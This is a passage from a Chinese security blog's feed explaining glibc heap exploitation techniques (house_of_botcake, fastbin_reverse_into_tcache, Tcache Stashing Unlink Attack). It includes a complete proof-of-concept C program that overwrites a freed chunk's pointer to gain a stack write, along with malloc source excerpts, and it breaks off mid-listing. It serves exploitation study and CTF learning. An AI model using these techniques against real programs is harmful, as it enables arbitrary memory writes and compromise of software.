 <span class="comment">/*VULNERABILITY*/</span></span><br></pre></td></tr></table></figure><p>最后更改fd，完美</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"We simply overwrite victim's fwd pointer"</span>);</span><br><span class="line">  b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// take target out</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now we can cash out the target chunk."</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The new chunk is at %p\n"</span>, c);</span><br></pre></td></tr></table></figure><h2 id="0x02-fastbin-reverse-into-tcache"><a href="#0x02-fastbin-reverse-into-tcache" class="headerlink" title="0x02 fastbin_reverse_into_tcache"></a>0x02 fastbin_reverse_into_tcache</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"This attack is intended to have a similar effect to the unsorted_bin_attack,\n"</span></span><br><span class="line">    <span class="string">"except it works with a small allocation size (allocsize &lt;= 0x78).\n"</span></span><br><span class="line">    <span class="string">"The goal is to set things up so that a call to malloc(allocsize) will write\n"</span></span><br><span class="line">    <span class="string">"a large unsigned value to the stack.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">    <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* p = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span></span><br><span class="line">    <span class="string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span></span><br><span class="line">    <span class="string">"already full, it will go in the fastbin.\n\n"</span>,</span><br><span class="line">    p</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span></span><br><span class="line">    <span class="string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span></span><br><span class="line">    <span class="string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span></span><br><span class="line">    <span class="string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span></span><br><span class="line">    <span class="string">"a single free is sufficient.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"The stack address that we intend to target: %p\n"</span></span><br><span class="line">    <span class="string">"It's current value is %p\n"</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"Now we use a vulnerability such as a buffer overflow or a use-after-free\n"</span></span><br><span class="line">    <span class="string">"to overwrite the next pointer at address %p\n\n"</span>,</span><br><span class="line">    p</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in p.</span></span><br><span class="line">  *(<span class="keyword">size_t</span>**)p = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"Let's just print the contents of our array on the stack now,\n"</span></span><br><span class="line">    <span class="string">"to show that it hasn't been modified yet.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span></span><br><span class="line">    <span class="string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span></span><br><span class="line">    <span class="string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span></span><br><span class="line">    <span class="string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span></span><br><span class="line">    <span class="string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span></span><br><span class="line">    <span class="string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span></span><br><span class="line">    <span class="string">"pointer is written to the stack.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span></span><br><span class="line">    <span class="string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span></span><br><span class="line">    <span class="string">"That's because the value on the stack is treated as a next pointer in the\n"</span></span><br><span class="line">    <span class="string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The contents of our array on the stack now look like this:\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个给的代码例子看起来貌似很复杂，但实际上是挺简单的过程，概括起来就是</p><p>先把tcache填满，然后再给fastbin填6个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">    <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* p = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span></span><br><span class="line">    <span class="string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span></span><br><span class="line">    <span class="string">"already full, it will go in the fastbin.\n\n"</span>,</span><br><span class="line">    p</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span></span><br><span class="line">    <span class="string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span></span><br><span class="line">    <span class="string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span></span><br><span class="line">    <span class="string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span></span><br><span class="line">    <span class="string">"a single free is sufficient.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后再修改fastbin尾部那个chunk的fd,把tcache清空。当从fastbin中取出chunk的时候，会把其它的fastbin中的chunk反向插入到tcache中，这样就可以实现把目的地址的fd写上一个堆地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Overwrite linked list pointer in p.</span></span><br><span class="line"> *(<span class="keyword">size_t</span>**)p = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"> <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"> <span class="built_in">fprintf</span>(</span><br><span class="line">   <span class="built_in">stderr</span>,</span><br><span class="line">   <span class="string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span></span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Empty tcache.</span></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">fprintf</span>(</span><br><span class="line">   <span class="built_in">stderr</span>,</span><br><span class="line">   <span class="string">"Let's just print the contents of our array on the stack now,\n"</span></span><br><span class="line">   <span class="string">"to show that it hasn't been modified yet.\n\n"</span></span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">fprintf</span>(</span><br><span class="line">   <span class="built_in">stderr</span>,</span><br><span class="line">   <span class="string">"\n"</span></span><br><span class="line">   <span class="string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span></span><br><span class="line">   <span class="string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span></span><br><span class="line">   <span class="string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span></span><br><span class="line">   <span class="string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span></span><br><span class="line">   <span class="string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span></span><br><span class="line">   <span class="string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span></span><br><span class="line">   <span class="string">"pointer is written to the stack.\n"</span></span><br><span class="line">   <span class="string">"\n"</span></span><br><span class="line">   <span class="string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span></span><br><span class="line">   <span class="string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span></span><br><span class="line">   <span class="string">"That's because the value on the stack is treated as a next pointer in the\n"</span></span><br><span class="line">   <span class="string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span></span><br><span class="line">   <span class="string">"\n"</span></span><br><span class="line">   <span class="string">"The contents of our array on the stack now look like this:\n\n"</span></span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> <span class="built_in">fprintf</span>(</span><br><span class="line">   <span class="built_in">stderr</span>,</span><br><span class="line">   <span class="string">"\n"</span></span><br><span class="line">   <span class="string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span>,</span><br><span class="line">   q</span><br><span class="line"> );</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;house_of_botcake 是针对2.29对double free做出限制以后提出的利用方法&lt;/p&gt;
&lt;p&gt;fastbin_reverse_into_tcache 是利用fastbin实现一个类似于unsorted bin attack的效果&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞利用" scheme="wood1314.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="tcache" scheme="wood1314.github.io/tags/tcache/"/>
    
  </entry>
  
  <entry>
    <title>Tcache Stashing Unlink Attack利用</title>
    <link href="wood1314.github.io/year/09/14/ckur473dw001aab15rmlzr3uq/"/>
    <id>wood1314.github.io/year/09/14/ckur473dw001aab15rmlzr3uq/</id>
    <published>2020-09-14T13:06:28.000Z</published>
    <updated>2020-09-14T14:39:41.065Z</updated>
    
    <content type="html"><![CDATA[<p>这种利用方法类似于house of lore,总结一下，留个模板以后备用</p><a id="more"></a><h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="1-1-house-of-lore"><a href="#1-1-house-of-lore" class="headerlink" title="1.1 house of lore"></a>1.1 house of lore</h3><h4 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h4><p>分配任意指定位置的 chunk，从而修改任意地址的内存。（任意地址写）</p><h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><p>能控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">    hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">    (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">    processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">    anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 若结果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="keyword">if</span> ( ( victim = last (bin) ) != bin )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">        <span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">        <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line">        <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">        <span class="comment">//执行更为细致的检查</span></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure><p>首先smallbin 如果 malloc的话，chunk是从链表尾部取的。如果free的话，chunk是添加到链表头部的(靠近bin的位置)。</p><p>现在small bin中有两个chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                        fd</span><br><span class="line">     |-----------------------------------------|</span><br><span class="line">     ↓        fd                  fd           |</span><br><span class="line">|--------|---------&gt;|---------|---------&gt;|----------|</span><br><span class="line">|smallbin|          |  chunk1 |          |  chunk2  | </span><br><span class="line">|--------|&lt;---------|---------|&lt;---------|----------|</span><br><span class="line">     |         bk                   bk        ↑</span><br><span class="line">     |                                        | </span><br><span class="line">     |----------------------------------------|</span><br><span class="line">     bk</span><br></pre></td></tr></table></figure><p>现在我们将 chunk2的 bk修改掉，fd不变</p><p>然后让fake_chunk的fd指向chunk2…..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br></pre></td></tr></table></figure><p>然后就可以把这个fake_chunk放到samll bin上了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>有一说一，这个条件还挺苛刻的</p><h2 id="0x02-Tcache-Stashing-Unlink-Attack"><a href="#0x02-Tcache-Stashing-Unlink-Attack" class="headerlink" title="0x02 Tcache Stashing Unlink Attack"></a>0x02 Tcache Stashing Unlink Attack</h2><h3 id="1-1-攻击目标"><a href="#1-1-攻击目标" class="headerlink" title="1.1 攻击目标"></a>1.1 攻击目标</h3><ol><li>向任意指定位置写入指定值。</li><li>向任意地址分配一个Chunk。</li></ol><h3 id="1-2-攻击前提"><a href="#1-2-攻击前提" class="headerlink" title="1.2 攻击前提"></a>1.2 攻击前提</h3><ol><li>能控制 Small Bin Chunk 的 bk 指针。</li><li>程序可以越过Tache取Chunk。(使用calloc即可做到)</li><li>程序至少可以分配两种不同大小且大小为unsorted bin的Chunk</li></ol><h3 id="1-3-攻击原理"><a href="#1-3-攻击原理" class="headerlink" title="1.3 攻击原理"></a>1.3 攻击原理</h3><p>我们首先分析<code>House of Lore Attack</code>中所忽视的Tcache相关代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 